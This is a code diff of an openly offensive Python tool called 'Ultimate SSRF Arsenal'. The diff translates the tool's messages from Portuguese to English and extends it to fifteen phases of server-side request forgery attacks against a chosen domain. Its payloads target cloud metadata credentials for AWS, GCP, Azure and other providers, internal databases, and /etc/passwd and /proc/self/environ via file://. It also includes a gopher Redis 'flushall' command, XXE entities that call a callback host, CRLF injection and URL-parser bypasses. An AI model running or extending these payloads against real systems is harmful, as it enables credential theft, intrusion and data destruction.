@@ -11,7 +11,7 @@ import sys
 
 from playwright.async_api import async_playwright, Response, Page
 
-# Cores ANSI
+# ANSI colors
 RED = "\033[91m"
 GREEN = "\033[92m"
 YELLOW = "\033[93m"
@@ -26,17 +26,15 @@ WARN = f"{YELLOW}[!]{RESET}"
 FAIL = f"{RED}[X]{RESET}"
 
 
-# ================= BANNER SIMPLES =================
 BANNER = f"""
 {BOLD}{CYAN}
 ╔════════════════════════════════════════════════════════════════╗
-║                  ULTIMATE SSRF ARSENAL                        ║
-║                Multi-Target Edition                           ║
-║         Auto-discovery + 9 Attack Phases                      ║
-║            Created by belladonnask                            ║
+║                ULTIMATE SSRF ARSENAL                          ║
+║              Multi‑Target Edition                             ║
+║         Auto‑discovery + 15 Attack Phases                     ║
+║            Created by belladonnask (enhanced)                 ║
 ╚════════════════════════════════════════════════════════════════╝
 {RESET}"""
-# ===================================================
 
 
 @dataclass
@@ -87,7 +85,7 @@ def max_severity(patterns: List[str]) -> str:
 
 
 class UltimateSSRFArsenal:
-    def __init__(self, target_domain: str, headless: bool = False, rate_limit_delay: float = 0.5, 
+    def __init__(self, target_domain: str, headless: bool = False, rate_limit_delay: float = 0.5,
                  callback_host: str = None, blind_timeout: int = 30):
         self.target_domain = target_domain
         self.base_url = f"https://{target_domain}"
@@ -102,13 +100,13 @@ class UltimateSSRFArsenal:
         self.context = None
         self.page = None
         self.intercepted_requests = []
-        
-        # Descoberta dinâmica
+
+        # Dynamic discovery
         self.discovered_endpoints: List[DiscoveredEndpoint] = []
         self.vulnerable_endpoints: List[DiscoveredEndpoint] = []
         self.all_params: Set[str] = set()
         self.blind_callbacks: Dict[str, List[Dict]] = defaultdict(list)
-        
+
         self.callback_pattern = re.compile(re.escape(self.callback_host))
 
     async def __aenter__(self):
@@ -130,13 +128,13 @@ class UltimateSSRFArsenal:
     async def intercept_request(self, route):
         request = route.request
         url = request.url
-        
+
         if self.callback_host != "YOUR.BURP.COLLABORATOR.NET" and self.callback_host in url:
             print(f"\n{RED}{BOLD}[!!! BLIND SSRF DETECTED !!!]{RESET}")
             print(f"  {CYAN}URL:{RESET} {url}")
             print(f"  {CYAN}Method:{RESET} {request.method}")
             print(f"  {CYAN}Headers:{RESET} {dict(request.headers)}")
-            
+
             evidence = SSRFEvidence(
                 phase="BLIND_SSRF", technique="Out-of-band callback",
                 url=url, endpoint="", param="", payload=url,
@@ -144,14 +142,15 @@ class UltimateSSRFArsenal:
                 severity="critical", out_of_band_hit=True
             )
             self.all_evidence.append(evidence)
-            
+
             timestamp = datetime.now().isoformat()
             self.blind_callbacks[url].append({
                 "timestamp": timestamp,
                 "method": request.method,
                 "headers": dict(request.headers)
             })
-        
+
+        # Intercept requests that look like internal/cloud SSRF
         if any(indicator in url.lower() for indicator in ["metadata", "internal", "localhost", "169.254", "10.", "172.", "192.168"]):
             post_data = None
             try:
@@ -166,8 +165,8 @@ class UltimateSSRFArsenal:
                 self.intercepted_requests.append(intercepted)
                 print(f"\n{YELLOW}[INTERCEPT]{RESET} {request.method} {url[:150]}")
             except Exception as e:
-                print(f"{WARN} Erro ao interceptar: {e}")
-        
+                print(f"{WARN} Error intercepting: {e}")
+
         await route.continue_()
 
     async def request_with_headers(self, method: str, url: str, data: dict = None,
@@ -175,7 +174,7 @@ class UltimateSSRFArsenal:
                                    follow_redirects: bool = True) -> Tuple[int, str, dict]:
         try:
             headers = custom_headers or {}
-            
+
             if method.upper() == "GET":
                 resp: Response = await self.page.goto(url, wait_until="domcontentloaded",
                                                        timeout=timeout)
@@ -188,10 +187,10 @@ class UltimateSSRFArsenal:
                 if content_type == "application/x-www-form-urlencoded":
                     body_data = urllib.parse.urlencode(post_data)
                 elif content_type == "multipart/form-data":
-                    body_data = json.dumps(post_data)
+                    body_data = json.dumps(post_data)  # simplified
                 else:
                     body_data = json.dumps(post_data)
-                
+
                 js_code = f"""
                 (async () => {{
                     try {{
@@ -215,10 +214,10 @@ class UltimateSSRFArsenal:
                 status = result.get("status", 0)
                 body = result.get("body", "")
                 headers_dict = result.get("headers", {})
-            
+
             await asyncio.sleep(self.rate_limit_delay)
             return status, body, headers_dict
-            
+
         except Exception as e:
             return 0, str(e), {}
 
@@ -238,7 +237,7 @@ class UltimateSSRFArsenal:
 
     async def phase_0_discovery(self):
         print(f"\n{BOLD}{'='*60}{RESET}")
-        print(f"{CYAN}[FASE 0]{RESET} Dynamic Discovery - Finding SSRF-vulnerable endpoints")
+        print(f"{CYAN}[PHASE 0]{RESET} Dynamic Discovery – Finding SSRF‑vulnerable endpoints")
         print(f"{BOLD}{'='*60}{RESET}")
 
         common_paths = [
@@ -249,9 +248,10 @@ class UltimateSSRFArsenal:
             "/render", "/parse", "/resolve", "/redirect", "/go",
             "/external", "/open", "/read", "/save", "/process",
             "/submit", "/form", "/contact", "/tools", "/utilities",
-            "/ajax", "/internal", "/services", "/graphql"
+            "/ajax", "/internal", "/services", "/graphql",
+            "/rest", "/soap", "/rpc", "/health", "/status"
         ]
-        
+
         test_payload = f"http://{self.callback_host}/discovery-test-{random.randint(1000,9999)}"
         methods = ["GET", "POST"]
         content_types = [
@@ -259,7 +259,7 @@ class UltimateSSRFArsenal:
             "application/x-www-form-urlencoded",
             "multipart/form-data"
         ]
-        
+
         for path in common_paths:
             for method in methods:
                 url = f"{self.base_url}{path}"
@@ -279,7 +279,7 @@ class UltimateSSRFArsenal:
                             self.discovered_endpoints.append(endpoint)
                             if self.callback_host in body or "discovery-test" in body:
                                 self.vulnerable_endpoints.append(endpoint)
-                                print(f"    {RED}⚡ POTENCIALMENTE VULNERÁVEL! Callback na resposta{RESET}")
+                                print(f"    {RED}⚡ POTENTIALLY VULNERABLE! Callback in response{RESET}")
                     else:
                         for ct in content_types:
                             headers = {"Content-Type": ct}
@@ -299,10 +299,11 @@ class UltimateSSRFArsenal:
                                 self.discovered_endpoints.append(endpoint)
                                 if self.callback_host in body:
                                     self.vulnerable_endpoints.append(endpoint)
-                                    print(f"    {RED}⚡ POTENCIALMENTE VULNERÁVEL! Callback na resposta{RESET}")
+                                    print(f"    {RED}⚡ POTENTIALLY VULNERABLE! Callback in response{RESET}")
                 except Exception:
                     continue
-        
+
+        # Crawl to discover additional endpoints
         try:
             await self.page.goto(self.base_url, wait_until="networkidle", timeout=15000)
             links = await self.page.evaluate("""() => {
@@ -326,66 +327,62 @@ class UltimateSSRFArsenal:
                         self.discovered_endpoints.append(endpoint)
                         if self.callback_host in body:
                             self.vulnerable_endpoints.append(endpoint)
-                            print(f"  {RED}⚡ VULNERÁVEL via crawling: {path}{RESET}")
+                            print(f"  {RED}⚡ VULNERABLE via crawling: {path}{RESET}")
         except Exception as e:
-            print(f"{WARN} Erro no crawling: {e}")
-        
-        print(f"\n{OK} Descoberta concluída:")
-        print(f"  • Endpoints encontrados: {len(self.discovered_endpoints)}")
-        print(f"  • Parâmetros únicos: {len(self.all_params)}")
-        print(f"  • Endpoints potencialmente vulneráveis: {len(self.vulnerable_endpoints)}")
-        
+            print(f"{WARN} Crawling error: {e}")
+
+        print(f"\n{OK} Discovery complete:")
+        print(f"  • Endpoints found: {len(self.discovered_endpoints)}")
+        print(f"  • Unique parameters: {len(self.all_params)}")
+        print(f"  • Potentially vulnerable endpoints: {len(self.vulnerable_endpoints)}")
+
         return self.vulnerable_endpoints if self.vulnerable_endpoints else self.discovered_endpoints
 
     async def check_ssrf_evidence(self, phase: str, technique: str, url: str, endpoint: str,
-                                  param: str, payload: str, status: int, body: str, 
+                                  param: str, payload: str, status: int, body: str,
                                   headers: dict = None, request_headers: dict = None) -> List[SSRFEvidence]:
         findings = []
         body_lower = body.lower()
         headers_str = json.dumps(headers or {}).lower()
         combined = body_lower + " " + headers_str
 
-        gcp_patterns = [
+        # Cloud / internal patterns
+        patterns = [
+            # GCP
             (r'(computeMetadata|metadata\.google\.internal)', 'Cloud metadata endpoint accessed', 'high'),
             (r'"access_token"\s*:\s*"[^"]{20,}"', 'Access token leaked', 'critical'),
             (r'"projectId"\s*:\s*"[a-z0-9-]+"', 'Project ID leaked', 'high'),
             (r'"email"\s*:\s*"[^"]+@[^"]+\.gserviceaccount\.com"', 'Service account email leaked', 'high'),
-        ]
-        aws_patterns = [
+            # AWS
             (r'(iam/security-credentials/[A-Za-z0-9_-]+)', 'AWS IAM role credentials leaked', 'critical'),
             (r'(?:"AccessKeyId"|"SecretAccessKey"|"Token")\s*:\s*"', 'AWS STS temporary credentials leaked', 'critical'),
             (r'arn:aws:iam::\d{12}:', 'AWS ARN leaked', 'high'),
-        ]
-        azure_patterns = [
+            # Azure
             (r'(computeMetadata|metadata\.azure\.com)', 'Azure metadata endpoint accessed', 'high'),
             (r'(?:"subscriptionId"|"subscription_id")', 'Azure subscription ID leaked', 'critical'),
-        ]
-        k8s_patterns = [
+            # Kubernetes
             (r'(kubernetes|k8s|kube-system)', 'Kubernetes endpoint accessed', 'critical'),
             (r'(?:"namespace"\s*:\s*"[a-z0-9-]+")', 'K8s namespace leaked', 'high'),
             (r'(?:"token"\s*:\s*"[A-Za-z0-9._-]{100,})', 'K8s service account token leaked', 'critical'),
-        ]
-        file_patterns = [
+            # File / sensitive content
             (r'(root:[^:]+:[0-9]+:[0-9]+:)', '/etc/passwd content leaked', 'critical'),
             (r'(-----BEGIN (RSA|DSA|EC|OPENSSH|PGP) PRIVATE KEY-----)', 'Private key material leaked', 'critical'),
             (r'(AKIA[0-9A-Z]{16})', 'AWS access key ID leaked', 'critical'),
-        ]
-        internal_patterns = [
+            # Internal IPs
             (r'(10\.\d{1,3}\.\d{1,3}\.\d{1,3})', 'Internal IP (10.x.x.x) leaked', 'high'),
             (r'(192\.168\.\d{1,3}\.\d{1,3})', 'Internal IP (192.168.x.x) leaked', 'high'),
             (r'(169\.254\.\d{1,3}\.\d{1,3})', 'Link-local IP (169.254.x.x) leaked', 'medium'),
-        ]
-        error_patterns = [
+            # Error messages
             (r'(SQLSTATE|mysql_error|PDOException)', 'SQL error message leaked', 'medium'),
             (r'(Warning:\s+file_get_contents|Warning:\s+curl_exec)', 'PHP SSRF warning leaked', 'high'),
             (r'(failed to open stream: Connection refused)', 'Internal connection refused', 'medium'),
             (r'Missing required header: Metadata-Flavor', 'Metadata requires specific header', 'info'),
+            # CRLF injection indicators
+            (r'(?<=\r\n|\r|\n)HTTP/', 'HTTP response smuggling detected', 'critical'),
         ]
-        all_patterns = (gcp_patterns + aws_patterns + azure_patterns + k8s_patterns +
-                        file_patterns + internal_patterns + error_patterns)
 
         matched_patterns = []
-        for pattern, description, severity in all_patterns:
+        for pattern, description, severity in patterns:
             if re.search(pattern, combined, re.IGNORECASE | re.MULTILINE):
                 matched_patterns.append(f"[{severity.upper()}] {description}")
 
@@ -405,7 +402,7 @@ class UltimateSSRFArsenal:
 
         return findings
 
-    async def test_endpoint_with_payload(self, endpoint: DiscoveredEndpoint, param: str, 
+    async def test_endpoint_with_payload(self, endpoint: DiscoveredEndpoint, param: str,
                                           payload: str, phase: str, technique: str) -> bool:
         if endpoint.method == "GET":
             separator = "&" if "?" in endpoint.path else "?"
@@ -446,13 +443,13 @@ class UltimateSSRFArsenal:
             print(f"\n{col}{BOLD}[{f.severity.upper()}]{RESET} {f.phase} → {f.technique}")
             print(f"  {DIM}URL:{RESET} {f.url[:200]}")
             print(f"  {DIM}Endpoint:{RESET} {f.endpoint}")
-            print(f"  {DIM}Parâmetro:{RESET} {f.param}")
+            print(f"  {DIM}Parameter:{RESET} {f.param}")
             print(f"  {DIM}Payload:{RESET} {f.payload[:100]}")
             print(f"  {DIM}Status:{RESET} {f.status}")
             for p in f.matched_patterns[:5]:
                 print(f"  {DIM}├─{RESET} {p}")
             if len(f.matched_patterns) > 5:
-                print(f"  {DIM}└─{RESET} ... e mais {len(f.matched_patterns)-5} padrões")
+                print(f"  {DIM}└─{RESET} ... and {len(f.matched_patterns)-5} more")
 
     async def save_results(self):
         data = {
@@ -478,11 +475,13 @@ class UltimateSSRFArsenal:
         }
         with open(self.results_file, "w") as f:
             json.dump(data, f, indent=2, ensure_ascii=False)
-        print(f"\n{OK} Resultados salvos em: {BOLD}{self.results_file}{RESET}")
+        print(f"\n{OK} Results saved to: {BOLD}{self.results_file}{RESET}")
+
+    # ---------- Attack Phases ----------
 
     async def phase_1_endpoint_validation(self, endpoints: List[DiscoveredEndpoint]):
         print(f"\n{BOLD}{'='*60}{RESET}")
-        print(f"{CYAN}[FASE 1]{RESET} Endpoint Validation")
+        print(f"{CYAN}[PHASE 1]{RESET} Endpoint Validation")
         print(f"{BOLD}{'='*60}{RESET}")
         test_payloads = [
             f"http://{self.callback_host}/validate-{{random}}",
@@ -501,7 +500,7 @@ class UltimateSSRFArsenal:
 
     async def phase_2_parameter_fuzzing(self, endpoints: List[DiscoveredEndpoint]):
         print(f"\n{BOLD}{'='*60}{RESET}")
-        print(f"{CYAN}[FASE 2]{RESET} Parameter Fuzzing (Dynamic)")
+        print(f"{CYAN}[PHASE 2]{RESET} Parameter Fuzzing (Dynamic)")
         print(f"{BOLD}{'='*60}{RESET}")
         ssrf_params = [
             "url", "uri", "u", "file", "filename", "path", "image", "img",
@@ -525,16 +524,25 @@ class UltimateSSRFArsenal:
                     "Phase 2 - Parameter Fuzzing", f"Testing param: {param}"
                 )
                 if found:
-                    print(f"  {GREEN}✓ Parâmetro vulnerável encontrado: {param}{RESET}")
+                    print(f"  {GREEN}✓ Vulnerable parameter found: {param}{RESET}")
 
     async def phase_3_localhost_bypass(self, endpoints: List[DiscoveredEndpoint]):
         print(f"\n{BOLD}{'='*60}{RESET}")
-        print(f"{CYAN}[FASE 3]{RESET} Localhost Bypass (Dynamic)")
+        print(f"{CYAN}[PHASE 3]{RESET} Localhost Bypass (All known representations)")
         print(f"{BOLD}{'='*60}{RESET}")
+        # All possible localhost representations
         localhost_variants = [
             "127.0.0.1", "127.0.0.2", "0.0.0.0", "2130706433", "0x7f000001",
             "0177.0.0.1", "[::1]", "[::ffff:127.0.0.1]", "localhost",
-            "127.0.0.1.nip.io", "2130706433.nip.io",
+            "127.0.0.1.nip.io", "2130706433.nip.io", "0x7f000001.nip.io",
+            "0177.0.0.1.nip.io",
+            "127.1", "0", "0x7f.1",
+            # IPv6 compressed and embedded
+            "[0:0:0:0:0:ffff:127.0.0.1]",
+            "[::ffff:7f00:1]",
+            # Hostnames that resolve to localhost
+            "localtest.me", "lvh.me", "vcap.me",
+            "spoofed.burpcollaborator.net",  # placeholders, replace if needed
         ]
         for endpoint in endpoints[:15]:
             params_to_test = list(endpoint.params)[:5] if endpoint.params else ["url", "uri"]
@@ -548,7 +556,7 @@ class UltimateSSRFArsenal:
 
     async def phase_4_gcp_metadata(self, endpoints: List[DiscoveredEndpoint]):
         print(f"\n{BOLD}{'='*60}{RESET}")
-        print(f"{CYAN}[FASE 4]{RESET} Cloud Metadata Attack (Dynamic)")
+        print(f"{CYAN}[PHASE 4]{RESET} GCP Metadata Attack (Dynamic)")
         print(f"{BOLD}{'='*60}{RESET}")
         metadata_paths = [
             "computeMetadata/v1/instance/service-accounts/default/token",
@@ -560,7 +568,7 @@ class UltimateSSRFArsenal:
         metadata_hosts = [
             "metadata.google.internal",
             "169.254.169.254",
-            "2130706433",
+            "2130706433",        # dword
             "metadata.google.internal:80",
         ]
         for endpoint in endpoints[:10]:
@@ -587,9 +595,9 @@ class UltimateSSRFArsenal:
                             if findings:
                                 await self.print_findings(findings)
 
-    async def phase_5_cloud_metadata(self, endpoints: List[DiscoveredEndpoint]):
+    async def phase_5_all_cloud_metadata(self, endpoints: List[DiscoveredEndpoint]):
         print(f"\n{BOLD}{'='*60}{RESET}")
-        print(f"{CYAN}[FASE 5]{RESET} Multi-Cloud Metadata (AWS/Azure)")
+        print(f"{CYAN}[PHASE 5]{RESET} All Cloud Metadata (AWS, Azure, Alibaba, Oracle, DigitalOcean, ...)")
         print(f"{BOLD}{'='*60}{RESET}")
         cloud_targets = {
             "AWS": {
@@ -598,15 +606,58 @@ class UltimateSSRFArsenal:
                     "latest/meta-data/iam/security-credentials/",
                     "latest/meta-data/instance-id",
                     "latest/user-data",
-                ]
+                ],
+                "headers": {}
             },
             "Azure": {
                 "hosts": ["169.254.169.254"],
                 "paths": [
                     "metadata/instance?api-version=2021-02-01&format=json",
                     "metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/",
-                ]
+                ],
+                "headers": {"Metadata": "true"}
             },
+            "Alibaba": {
+                "hosts": ["100.100.100.200"],
+                "paths": [
+                    "latest/meta-data/",
+                    "latest/meta-data/instance-id",
+                    "latest/user-data",
+                ],
+                "headers": {}
+            },
+            "Oracle": {
+                "hosts": ["169.254.169.254"],
+                "paths": [
+                    "opc/v1/instance/",
+                    "opc/v1/instance/metadata/",
+                ],
+                "headers": {}
+            },
+            "DigitalOcean": {
+                "hosts": ["169.254.169.254"],
+                "paths": [
+                    "metadata/v1.json",
+                    "metadata/v1/id",
+                ],
+                "headers": {}
+            },
+            "Huawei": {
+                "hosts": ["169.254.169.254"],
+                "paths": [
+                    "latest/meta-data/",
+                    "latest/user-data",
+                ],
+                "headers": {}
+            },
+            "Tencent": {
+                "hosts": ["metadata.tencentyun.com"],
+                "paths": [
+                    "latest/meta-data/",
+                    "latest/user-data",
+                ],
+                "headers": {}
+            }
         }
         for endpoint in endpoints[:10]:
             params_to_test = list(endpoint.params)[:3] if endpoint.params else ["url"]
@@ -617,12 +668,27 @@ class UltimateSSRFArsenal:
                             target_url = f"http://{host}/{path}"
                             await self.test_endpoint_with_payload(
                                 endpoint, param, target_url,
-                                "Phase 5 - Multi-Cloud Metadata", f"{cloud}: {host}"
+                                f"Phase 5 - {cloud} Metadata", f"{cloud}: {host}{path}"
                             )
+                            if config["headers"]:
+                                test_url = f"{self.base_url}{endpoint.path}"
+                                headers = {**config["headers"], "Content-Type": "application/json"}
+                                data = {param: target_url}
+                                status, body, headers_resp = await self.request_with_headers(
+                                    "POST", test_url, data=data, custom_headers=headers, timeout=15000
+                                )
+                                findings = await self.check_ssrf_evidence(
+                                    f"Phase 5 - {cloud} Metadata (with headers)",
+                                    f"{cloud}: {host}{path}",
+                                    test_url, endpoint.path, param, target_url,
+                                    status, body, headers_resp
+                                )
+                                if findings:
+                                    await self.print_findings(findings)
 
     async def phase_6_internal_services(self, endpoints: List[DiscoveredEndpoint]):
         print(f"\n{BOLD}{'='*60}{RESET}")
-        print(f"{CYAN}[FASE 6]{RESET} Internal Services Scan")
+        print(f"{CYAN}[PHASE 6]{RESET} Internal Services Scan")
         print(f"{BOLD}{'='*60}{RESET}")
         internal_services = [
             ("http://127.0.0.1:9200", "Elasticsearch"),
@@ -634,6 +700,11 @@ class UltimateSSRFArsenal:
             ("http://127.0.0.1:3000", "Grafana"),
             ("http://127.0.0.1:8080", "Jenkins"),
             ("redis://127.0.0.1:6379", "Redis"),
+            ("http://127.0.0.1:6379", "Redis HTTP"),
+            ("http://127.0.0.1:11211", "Memcached"),
+            ("http://127.0.0.1:27017", "MongoDB"),
+            ("http://127.0.0.1:5432", "PostgreSQL"),
+            ("http://127.0.0.1:3306", "MySQL"),
         ]
         for endpoint in endpoints[:10]:
             params_to_test = list(endpoint.params)[:3] if endpoint.params else ["url"]
@@ -646,14 +717,19 @@ class UltimateSSRFArsenal:
 
     async def phase_7_protocol_attacks(self, endpoints: List[DiscoveredEndpoint]):
         print(f"\n{BOLD}{'='*60}{RESET}")
-        print(f"{CYAN}[FASE 7]{RESET} Protocol Attacks")
+        print(f"{CYAN}[PHASE 7]{RESET} Protocol Attacks (file, gopher, dict, ftp, ldap, ...)")
         print(f"{BOLD}{'='*60}{RESET}")
         protocol_payloads = [
             ("file:///etc/passwd", "file:// /etc/passwd"),
             ("file:///etc/hosts", "file:// /etc/hosts"),
+            ("file:///proc/self/environ", "file:// /proc/self/environ"),
             ("gopher://127.0.0.1:6379/_INFO", "gopher:// Redis INFO"),
             ("dict://127.0.0.1:6379/INFO", "dict:// Redis INFO"),
-            ("file:///proc/self/environ", "file:// /proc/self/environ"),
+            ("ftp://127.0.0.1:21/", "ftp:// localhost"),
+            ("ldap://127.0.0.1:389/", "ldap:// localhost"),
+            ("tftp://127.0.0.1:69/", "tftp:// localhost"),
+            ("netdoc://127.0.0.1/", "netdoc:// localhost"),
+            ("jar:http://127.0.0.1/", "jar: protocol"),
         ]
         for endpoint in endpoints[:10]:
             params_to_test = list(endpoint.params)[:3] if endpoint.params else ["url"]
@@ -666,7 +742,7 @@ class UltimateSSRFArsenal:
 
     async def phase_8_redirect_bypass(self, endpoints: List[DiscoveredEndpoint]):
         print(f"\n{BOLD}{'='*60}{RESET}")
-        print(f"{CYAN}[FASE 8]{RESET} Open Redirect Bypass")
+        print(f"{CYAN}[PHASE 8]{RESET} Open Redirect / URL Parser Bypass")
         print(f"{BOLD}{'='*60}{RESET}")
         redirect_patterns = [
             f"//{self.callback_host}/test",
@@ -674,6 +750,10 @@ class UltimateSSRFArsenal:
             f"http://{self.callback_host}/test",
             f"/\\{self.callback_host}/test",
             f"https://{self.target_domain}@{self.callback_host}/test",
+            f"https://{self.callback_host}#@{self.target_domain}/",
+            f"https://{self.target_domain}%23@{self.callback_host}/",
+            f"http://{self.callback_host}%00.{self.target_domain}/",
+            f"http://{self.callback_host}?dummy=.target.com/",
         ]
         for endpoint in endpoints[:10]:
             params_to_test = list(endpoint.params)[:3] if endpoint.params else ["url", "redirect", "next"]
@@ -686,13 +766,18 @@ class UltimateSSRFArsenal:
 
     async def phase_9_dns_rebinding(self, endpoints: List[DiscoveredEndpoint]):
         print(f"\n{BOLD}{'='*60}{RESET}")
-        print(f"{CYAN}[FASE 9]{RESET} DNS Rebinding")
+        print(f"{CYAN}[PHASE 9]{RESET} DNS Rebinding & Wildcard Domains")
         print(f"{BOLD}{'='*60}{RESET}")
         rebind_domains = [
             f"{self.callback_host}.nip.io",
-            f"169.254.169.254.nip.io",
-            f"metadata.google.internal.nip.io",
+            "169.254.169.254.nip.io",
+            "metadata.google.internal.nip.io",
             "127.0.0.1.nip.io",
+            "localtest.me",
+            "lvh.me",
+            "vcap.me",
+            "spoofed.burpcollaborator.net",   # example
+            "1.1.1.1.nip.io",                # to probe DNS
         ]
         for endpoint in endpoints[:5]:
             params_to_test = list(endpoint.params)[:3] if endpoint.params else ["url"]
@@ -704,23 +789,138 @@ class UltimateSSRFArsenal:
                         "Phase 9 - DNS Rebinding", f"Testing {domain}"
                     )
 
+    async def phase_10_xxe_injection(self, endpoints: List[DiscoveredEndpoint]):
+        print(f"\n{BOLD}{'='*60}{RESET}")
+        print(f"{CYAN}[PHASE 10]{RESET} XXE Injection to SSRF")
+        print(f"{BOLD}{'='*60}{RESET}")
+        xxe_payloads = [
+            f"""<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "http://{self.callback_host}/xxe-test">]><root>&xxe;</root>""",
+            f"""<?xml version="1.0"?><!DOCTYPE root [<!ENTITY % xxe SYSTEM "http://{self.callback_host}/xxe-param"> %xxe;]><root/>""",
+        ]
+        for endpoint in endpoints:
+            if "xml" in endpoint.content_type.lower() or endpoint.content_type == "application/xml":
+                print(f"  Testing XML endpoint: {endpoint.path}")
+                for payload in xxe_payloads:
+                    headers = {"Content-Type": "application/xml"}
+                    status, body, headers_resp = await self.request_with_headers(
+                        "POST", f"{self.base_url}{endpoint.path}",
+                        data=payload, custom_headers=headers, timeout=15000
+                    )
+                    findings = await self.check_ssrf_evidence(
+                        "Phase 10 - XXE", f"XXE SSRF to {self.callback_host}",
+                        f"{self.base_url}{endpoint.path}", endpoint.path, "", payload,
+                        status, body, headers_resp
+                    )
+                    if findings:
+                        await self.print_findings(findings)
+
+    async def phase_11_encoding_bypass(self, endpoints: List[DiscoveredEndpoint]):
+        print(f"\n{BOLD}{'='*60}{RESET}")
+        print(f"{CYAN}[PHASE 11]{RESET} Encoding Bypass (URL, Unicode, Double)")
+        print(f"{BOLD}{'='*60}{RESET}")
+        # Various encoded representations of http://callback_host/
+        encodings = [
+            f"http://{self.callback_host}/enc-test",
+            f"http:%2f%2f{self.callback_host}%2fenc-test",
+            f"http:\\\\{self.callback_host}\\enc-test",
+            f"http://{self.callback_host}%2fenc-test",
+            f"http://{self.callback_host}%252fenc-test",  # double encoding
+            f"http://{self.callback_host}%00.trusted.com/",
+            f"http://{urllib.parse.quote(self.callback_host)}:80/enc-test",
+        ]
+        for endpoint in endpoints[:10]:
+            params_to_test = list(endpoint.params)[:3] if endpoint.params else ["url"]
+            for param in params_to_test:
+                for payload in encodings:
+                    await self.test_endpoint_with_payload(
+                        endpoint, param, payload,
+                        "Phase 11 - Encoding Bypass", f"Testing encoding"
+                    )
+
+    async def phase_12_crlf_injection(self, endpoints: List[DiscoveredEndpoint]):
+        print(f"\n{BOLD}{'='*60}{RESET}")
+        print(f"{CYAN}[PHASE 12]{RESET} CRLF Injection / HTTP Smuggling SSRF")
+        print(f"{BOLD}{'='*60}{RESET}")
+        crlf_payloads = [
+            f"http://127.0.0.1/%0d%0aX-Injected:%20true%0d%0a%0d%0a",
+            f"http://127.0.0.1/%0d%0aHost:%20localhost%0d%0a%0d%0a",
+            f"http://127.0.0.1/%0a%0dX-Test:%201",
+        ]
+        for endpoint in endpoints[:10]:
+            params_to_test = list(endpoint.params)[:3] if endpoint.params else ["url"]
+            for param in params_to_test:
+                for payload in crlf_payloads:
+                    await self.test_endpoint_with_payload(
+                        endpoint, param, payload,
+                        "Phase 12 - CRLF Injection", f"Payload: {payload[:50]}..."
+                    )
+
+    async def phase_13_url_fragment_bypass(self, endpoints: List[DiscoveredEndpoint]):
+        print(f"\n{BOLD}{'='*60}{RESET}")
+        print(f"{CYAN}[PHASE 13]{RESET} Advanced URL Parser Bypass (Fragment, Userinfo)")
+        print(f"{BOLD}{'='*60}{RESET}")
+        fragments = [
+            f"http://{self.callback_host}#@{self.target_domain}/",
+            f"http://{self.target_domain}#@{self.callback_host}/",
+            f"http://{self.callback_host}%23@{self.target_domain}/",
+            f"http://{self.callback_host}:80%23{self.target_domain}/",
+            f"http://{self.callback_host}\\@{self.target_domain}/",
+        ]
+        for endpoint in endpoints[:10]:
+            params_to_test = list(endpoint.params)[:3] if endpoint.params else ["url"]
+            for param in params_to_test:
+                for payload in fragments:
+                    await self.test_endpoint_with_payload(
+                        endpoint, param, payload,
+                        "Phase 13 - URL Fragment Bypass", f"Testing fragment"
+                    )
+
+    async def phase_14_exotic_protocols(self, endpoints: List[DiscoveredEndpoint]):
+        print(f"\n{BOLD}{'='*60}{RESET}")
+        print(f"{CYAN}[PHASE 14]{RESET} Exotic / Legacy Protocols")
+        print(f"{BOLD}{'='*60}{RESET}")
+        protocols = [
+            "gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$64%0d%0a",
+            "dict://127.0.0.1:11211/stat",
+            "tftp://127.0.0.1:69/",
+            "ldap://127.0.0.1:389/",
+            "ldaps://127.0.0.1:636/",
+            "netdoc://127.0.0.1/",
+            "jar:http://127.0.0.1/",
+        ]
+        for endpoint in endpoints[:5]:
+            params_to_test = list(endpoint.params)[:3] if endpoint.params else ["url"]
+            for param in params_to_test:
+                for payload in protocols:
+                    await self.test_endpoint_with_payload(
+                        endpoint, param, payload,
+                        "Phase 14 - Exotic Protocols", f"Testing {payload[:40]}..."
+                    )
+
     async def run_all_phases(self):
         endpoints = await self.phase_0_discovery()
         if not endpoints:
-            print(f"\n{FAIL} Nenhum endpoint encontrado para testar. Encerrando.")
+            print(f"\n{FAIL} No endpoints found to test. Exiting.")
             return
-        print(f"\n{BOLD}{GREEN}✓ {len(endpoints)} endpoints encontrados. Iniciando ataques...{RESET}")
+        print(f"\n{BOLD}{GREEN}✓ {len(endpoints)} endpoints discovered. Starting attacks...{RESET}")
+
         phases = [
             (self.phase_1_endpoint_validation(endpoints), "Phase 1: Endpoint Validation"),
             (self.phase_2_parameter_fuzzing(endpoints), "Phase 2: Parameter Fuzzing"),
             (self.phase_3_localhost_bypass(endpoints), "Phase 3: Localhost Bypass"),
-            (self.phase_4_gcp_metadata(endpoints), "Phase 4: Cloud Metadata Attack"),
-            (self.phase_5_cloud_metadata(endpoints), "Phase 5: Multi-Cloud Metadata"),
+            (self.phase_4_gcp_metadata(endpoints), "Phase 4: GCP Metadata"),
+            (self.phase_5_all_cloud_metadata(endpoints), "Phase 5: All Cloud Metadata"),
             (self.phase_6_internal_services(endpoints), "Phase 6: Internal Services"),
             (self.phase_7_protocol_attacks(endpoints), "Phase 7: Protocol Attacks"),
             (self.phase_8_redirect_bypass(endpoints), "Phase 8: Redirect Bypass"),
             (self.phase_9_dns_rebinding(endpoints), "Phase 9: DNS Rebinding"),
+            (self.phase_10_xxe_injection(endpoints), "Phase 10: XXE SSRF"),
+            (self.phase_11_encoding_bypass(endpoints), "Phase 11: Encoding Bypass"),
+            (self.phase_12_crlf_injection(endpoints), "Phase 12: CRLF Injection"),
+            (self.phase_13_url_fragment_bypass(endpoints), "Phase 13: URL Fragment Bypass"),
+            (self.phase_14_exotic_protocols(endpoints), "Phase 14: Exotic Protocols"),
         ]
+
         for coro, name in phases:
             try:
                 print(f"\n{BOLD}{'='*60}{RESET}")
@@ -728,7 +928,8 @@ class UltimateSSRFArsenal:
                 print(f"{BOLD}{'='*60}{RESET}")
                 await coro
             except Exception as e:
-                print(f"{FAIL} Erro em {name}: {e}")
+                print(f"{FAIL} Error in {name}: {e}")
+
         await self.save_results()
 
 
@@ -746,10 +947,10 @@ async def scan_single_target(target: str, callback_host: str, delay: float):
     try:
         await arsenal.run_all_phases()
         print(f"\n{BOLD}{'='*60}{RESET}")
